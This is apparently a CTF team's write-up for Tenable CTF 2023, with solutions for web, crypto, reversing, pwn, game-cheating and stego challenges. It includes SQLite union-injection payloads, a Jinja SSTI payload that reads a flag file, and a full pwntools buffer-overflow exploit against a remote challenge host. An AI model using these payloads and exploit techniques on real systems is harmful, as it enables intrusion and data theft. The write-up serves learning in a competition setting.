# Tenable CTF 2023

## Intro
### CTF Basics
flag{thanks_4_joining_us}

### Discord Support
flag{n33d5_4_tick3t}

## Web/Cloud
### Cat Viewer

observe the url found that parameter `cat` is wierd

try sql injection attack

after trying `'`, `"`, found `"` will show an error message, and recognize that it use sqlite as database

trying union-based attack

using [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) and craft such payload

```!
cat=addsadasd%22%20union%20select%20null,null,null,null
```

found number of column is 4

craft payload below:

```!
cat=addsadasd%22%20union%20select%20null,null,1,null
```

found name is at position 3

craft payload below:

```!
cat=addsadasd"%20union%20select%20null,null,sql,null%20from%20sqlite_schema%20--
```

found database structure and know a table `cats` with column contains `flag`

get all possible flags with this payload:

```!
cat=addsadasd%22%20union%20select%20null,null,flag,null%20from%20cats%20--
```

`flag{a_sea_of_cats}`

### Rose
:::success
ssti vulnerbility in `main.py`
```htmlmixed
{% extends "base.html" %} {% block content %}
<h1 class="title">
    Welcome, '''+ session["name"] +'''!
</h1>
<p> The dashboard feature is currently under construction! </p>
{% endblock %}
```
:::spoiler
register name:
```
{{url_for.__globals__['__builtins__']['open']('/home/ctf/flag.txt').read()}}
```
session cookie:
`.eJwljsuqgzAUAP8lm7RQNO_E_kop4SQ5pxVSLVHhgvjvV-huBmYxO4vUcHmz-9o2vLE4FnZnIEBII8gLndE4aQYnCxRTnPCDQkhSoSfpPRICauMNkM8GhA4eUgaJ2aqkSATIqWhpjVVFQpDFYSYLylkig2IoQYkQlPXOnJHOXmBQKbBzZFuw_W7kqRN88MR931qNNLcuxledE9QlxgePMW1jXcfpNP588PmLE39eeP-eP9jnlXqq8OrWv5Vfu4ZQLtfjYMc_5CFNSA.ZNOqjw.9bO_YZG5wcaWf-R5Y56IZAu6oEg`
:::

`flag{wh4ts_1n_a_n4m3_4nd_wh4ts_in_y0ur_fl4sk}`

## Crypto
### PseudoRandom

:::success

just bruteeforce the timestamp

:::spoiler
```python=
import random
import base64
from Crypto.Cipher import AES

iv = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
enc = base64.b64decode("lQbbaZbwTCzzy73Q+0sRVViU27WrwvGoOzPv66lpqOWQLSXF9M8n24PE5y4K2T6Y")

for seed in range(1691035200000, 1690819200000, -1):
    random.seed(seed)
    key = []
    for i in range(0,16):
        key.append(random.randint(0,255))

    key = bytearray(key)

    cipher = AES.new(key, AES.MODE_CBC, iv) 
    plaintext = cipher.decrypt(enc)
    if(b"flag" in plaintext):
        print(seed, plaintext)
    if seed % 100000 == 0:
        print(seed)
```
:::

seed = 1690986434439

`flag{r3411y_R4nd0m_15_R3ally_iMp0r7ant}`

### Quantum Crypto

:::success

generate a easy-calculate data and follow the crypto procedure

:::spoiler
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES
import numpy as np

def bitstring_to_bytes(string: str) -> bytes:
    rev = string[::-1]
    retbyte = b""
    tmp = ""
    for i,b in enumerate(rev):
        tmp += b
        if i % 8 == 7:
            retbyte += bytes([int(tmp, 2)])
            tmp = ""
    return retbyte

data = {"state_list":[[0.0,1.0] for _ in range(1024)], "basis_list":["X" for _ in range(1024)]}
url = "https://nessus-quantumcrypto.chals.io/quantum_key"

res = requests.post(url, json=data)
result = res.json()

H = np.array([[1.0,1.0],[1.0,-1.0]])/np.sqrt(2), 
X = np.array([[0.0,1.0],[1.0,0.0]])
key_bits = ''
for i in range(0, 1024):
    if(result["basis"][i] == data["basis_list"][i]):
        if(data["basis_list"][i] == "H"):
            state = np.dot(H, data["state_list"][i])
        else:
            state = np.dot(X, data["state_list"][i])

        if(state[0] > .99):
            key_bits += '1'
        else:
            key_bits += '0'

key = bitstring_to_bytes(key_bits[0:128])


cipher = AES.new(key, AES.MODE_CBC, iv=b64decode(result["iv"]))
plaintext = cipher.decrypt(b64decode(result["ciphertext"]))
print(plaintext)
```
:::

`flag{d0nT_T0uch_QB17s_ar3_FraG1l3}`

## Reverse/Pwn
### The Javascript One
:::success
use [javascript deobfuscator](https://obf-io.deobfuscate.io/) to clean up junky code
:::spoiler
```javascript
function encryptFlag(rawFlag) {
  var result = ''
  for (var i = 0; i < rawFlag.length; i++) {
    var tmp = rawFlag.charCodeAt(i)
    var ch = tmp ^ i
    result += String.fromCharCode(ch)
  }
  return btoa(result)
}
```
```javascript 
// decrypt.js
var encrypted = 'fmcd v7kdpUam{:|sc#c`h'
let result = ''

for (let i = 0; i < encrypted.length; i++) {
	var tmp = encrypted.charCodeAt(i)
    var ch = tmp ^ i
    result += String.fromCharCode(ch)
}

console.log(result)
```
:::
`flag{s1lly_jav4scr1pt}`

### Skiddyana Pwnz and the Loom of Fate

There is a bof vulnerability between `loomRoom` and `fatesRoom` because of the stack size is different

In `loomRoom`, it has a 0x10c length buffer for `src`. But in `fatesRoom`, its buffer can only carry 0x90 characters. Therefore, bof occurs. Also, there is a gadget function called `theVoid`, which can help us getting the flag.

It is fine when testing locally, but on the remote side. It will not pass the password check. It may needs to leak the password.

After observation, found that there is another out-of-bound write vulnerability inside `loomRoom`, which can modify `dest` value and affact the pointer from `Drink your ovaltine` to `thisisnotthepassword`. Make the leak possible along with the second option.


:::spoiler fully exploit
```python=
from pwn import *
binary = "./loom"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("0.cloud.chals.io", 33616)
# conn = process(binary)
# conn = gdb.debug(binary)

conn.sendlineafter(b"4) leave", b"1")
conn.sendlineafter(b"2) Leave", b"1")
conn.send(b"a"*(0x11d-4-1) + b"\x2a\x23\x40\x00\x00")
conn.sendlineafter(b"4) leave", b"2")
conn.recvuntil(b"ancient : \n\n")
password = conn.recvline().strip()
print(password)

conn.sendlineafter(b"4) leave", b"1")
conn.sendlineafter(b"2) Leave", b"1")

payload = b"a"*(144+8) + p64(0x4012b6) # theVoid
conn.sendline(payload)

conn.sendlineafter(b"4) leave", b"3")
conn.sendlineafter(b"Speak the unpronouncable phrase to pass to the room of fates :", password)
conn.sendlineafter(b"2) No", b"1")
conn.interactive()
```
:::

`flag{d0nt_f0rg3t_y0ur_h4t}`

### Brick Breaker

According to [this article](https://www.starcubelabs.com/reverse-engineering-ds/), using the `DeSmuME` tool to cheat

First, trying to play, and found that it will have 5 life to play brickbreak.

tools -> RAM search with value `5` -> lose 1 life -> search with `less than previous value` -> found address 0x02060DB8 may be the container store life. Adding a cheat on it and got infinite life to play.

playing and observe that address 0x02060DBA may be the level of the map. Also add a cheat and changing it before end of the level. After clear all the brick, it will jump to the level we assigned.

play level from 6 -> 17

`flag{Br3Ak0U7!!1}`

## OSINT
### Star your engine
https://startyourengines.ca/index.html

## Stego
### Cyberpunk Cafe
:::success
[Solver](https://www.dcode.fr/binary-image)
size = 41
:::spoiler
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111000100111110110000011111110000000010000010101111101111010000100000100000000101110101010011110111100101011101000000001011101010000010110010100010111010000000010111010101011111000100110101110100000000100000101010110000110010001000001000000001111111010101010101010101011111110000000000000000010111110010000100000000000000000001001111100010110001100110111110000000001111110000010101110101111011001010000000010011011110111101111100111101110100000000011011000011111100100100101001001000000000000101111011101101011011110000000000000011110100010001100010100111100100100000000001010100000010010010011011010101000000001101000110100111111010010101010000000000000011111111001100110101110100101100000000000001001100101000000111101001001000000001001111111111000110100010010010010000000010111001111000010111101101000101000000000001010111001111010100000101101000000000000011110110010111010111100111010010000000011100111110010100110100100100000100000000001100010111100101111010111111000000000001111011000001110110100001111101110000000000000000100101011100000110001010100000000111111101111010010010110101010101000000001000001011001110010000101000110100000000010111010001010000011111111111001100000000101110100110011011110111110011101000000001011101011011000100101111000110110000000010000010000011110010011011000100000000000111111100011011111010000111000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
:::

![](https://hackmd.io/_uploads/Hk3DLag2h.png)

flag{br1ng_b4ck_phys1c4l_menu5}

## Forensics

## Misc
### OneShotGPT

### Better OneShotGPT